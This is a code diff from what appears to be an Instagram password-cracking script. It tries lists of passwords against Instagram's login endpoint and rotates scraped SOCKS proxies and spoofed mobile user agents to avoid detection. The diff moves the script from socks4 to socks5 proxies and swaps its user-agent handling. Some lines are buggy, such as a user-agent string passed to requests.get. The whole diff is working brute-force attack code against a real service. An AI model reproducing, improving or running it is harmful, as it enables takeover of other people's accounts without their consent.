@@ -351,8 +351,8 @@ def ___email___():
 # Proxy
 def ___proxy___():
     try:
-        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks4&timeout=100000&country=all&ssl=all&anonymity=all').text
-        open('Data/proxy.txt', 'w').write(___roz)
+        ___roz = requests.get('https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=100000&country=all&ssl=all&anonymity=all').text
+        open('Data/proxy2.txt', 'w').write(___roz)
     except Exception as e:
         ___roz = requests.get('https://raw.githubusercontent.com/MN4WN1-777/ignew/master/Data/proxy.txt').text
         open('Data/proxy.txt', 'w').write(___roz)
@@ -406,22 +406,14 @@ class ___crack___:
         try:
             ___useragent = open('Data/ua.txt', 'r').read()
         except (IOError):
-            ___useragent = random.choice['___ua1']['___ua2']['___ua3']['___ua4']['___ua5']['___ua6']['___ua7']['___ua8']['___ua9']
-            ___ua1 = ('Mozilla/5.0 (Linux; Android 6.0.1; Redmi 4A Build/MMB29M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.116 Mobile Safari/537.36')
-            ___ua2 = ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.101 Mobile Safari/537.36')
-            ___ua3 = ('Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-            ___ua4 = ('Mozilla/5.0 (Linux; Android 10; Redmi 7A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-            ___ua5 = ('Mozilla/5.0 (Linux; Android 10; Redmi 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-            ___ua6 = ('Mozilla/5.0 (Linux; Android 10; Redmi 8A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-            ___ua7 = ('Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-            ___ua8 = ('Mozilla/5.0 (Linux; Android 9; Redmi 6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
-            ___ua9 = ('Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36')
+            ___useragent = ('Mozilla/5.0 (Linux; Android 12; SO-53B Build/61.1.C.2.158; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.71 Mobile Safari/537.36 Instagram 244.1.0.19.110 Android (31/12; 420dpi; 1080x2394; Sony/docomo; SO-53B; SO-53B; qcom; ja_JP; 384108453)')
+            ___useragent = requests.get('Instagram 141.0.0.17.118 Android (29/10; 450dpi; 1080x2192; samsung; SM-G986U; y2q; qcom; en_US; 213368022)')
         try:
             for pw in pwx:
                 pw = pw.lower()
                 ___url = ('https://i.instagram.com/')
                 ___login = ('https://i.instagram.com/accounts/login/ajax/')
-                ___proxy = {'http': 'socks4://%s'%(random.choice(open("Data/proxy.txt","r").read().splitlines()))}
+                ___proxy = {'http': 'socks5://%s'%(random.choice(open("Data/proxy2.txt","r").read().splitlines()))}
                 ___csrf = requests.get(___url).cookies['csrftoken']
                 ___data = {'username': uid,
                 'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{time}:{pw}',
